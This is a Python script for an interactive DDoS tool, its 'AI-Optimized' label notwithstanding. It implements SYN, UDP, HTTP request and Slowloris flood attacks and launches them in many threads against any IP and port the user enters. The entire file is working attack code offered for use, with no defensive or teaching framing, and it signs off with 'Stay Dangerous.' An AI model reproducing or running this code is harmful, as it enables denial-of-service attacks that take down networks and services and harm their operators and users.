import os
import sys
import socket
import threading
import time
import random
from scapy.all import *

# AI-Enhanced Attack Payloads
def generate_payload(size=1024):
    """Generate a randomized payload to maximize effectiveness."""
    return random._urandom(size)

# Adaptive SYN Flood Attack
def syn_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    print(f"🔥 Launching SYN Flood on {target_ip}:{target_port} for {duration} seconds...")
    
    while time.time() < timeout:
        try:
            ip = IP(dst=target_ip)
            tcp = TCP(dport=target_port, flags="S")
            raw = Raw(load=generate_payload(1024))
            send(ip/tcp/raw, verbose=False)
        except Exception as e:
            pass

# Adaptive UDP Flood Attack
def udp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = generate_payload(4096)

    print(f"🔥 Launching UDP Flood on {target_ip}:{target_port} for {duration} seconds...")
    while time.time() < timeout:
        sock.sendto(payload, (target_ip, target_port))
    print("✅ UDP Flood Completed.")

# HTTP Request Flood
def http_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    print(f"🔥 Launching HTTP Flood on {target_ip}:{target_port} for {duration} seconds...")

    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode())
            s.close()
        except:
            pass
    print("✅ HTTP Flood Completed.")

# Advanced Slowloris Attack
def slowloris(target_ip, target_port, duration):
    timeout = time.time() + duration
    sock_list = []
    print(f"🔥 Launching Slowloris on {target_ip}:{target_port} for {duration} seconds...")

    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
            sock_list.append(s)
        except:
            pass

    while time.time() < timeout:
        for s in sock_list:
            try:
                s.send(f"X-a: {random.randint(1, 1000)}\r\n".encode())
            except:
                pass
    print("✅ Slowloris Attack Completed.")

# AI-Optimized DDoS Command Lobby
def lobby():
    while True:
        print("\n🔥 AI-Optimized DDoS Command Lobby 🔥")
        print("[1] SYN Flood")
        print("[2] UDP Flood")
        print("[3] HTTP Flood")
        print("[4] Slowloris")
        print("[5] Exit")
        choice = input("⚔️ Select Attack: ")

        if choice in ["1", "2", "3", "4"]:
            target_ip = input("🎯 Target IP: ")
            target_port = int(input("🎯 Target Port: "))
            duration = int(input("⏳ Attack Duration (seconds): "))
            threads = int(input("🚀 Number of Threads: "))

            attack_func = {
                "1": syn_flood,
                "2": udp_flood,
                "3": http_flood,
                "4": slowloris
            }[choice]

            for _ in range(threads):
                thread = threading.Thread(target=attack_func, args=(target_ip, target_port, duration))
                thread.start()

        elif choice == "5":
            print("👋 Exiting... Stay Dangerous.")
            break
        else:
            print("❌ Invalid choice. Try again.")

# Execute Command Lobby
if __name__ == "__main__":
    lobby()
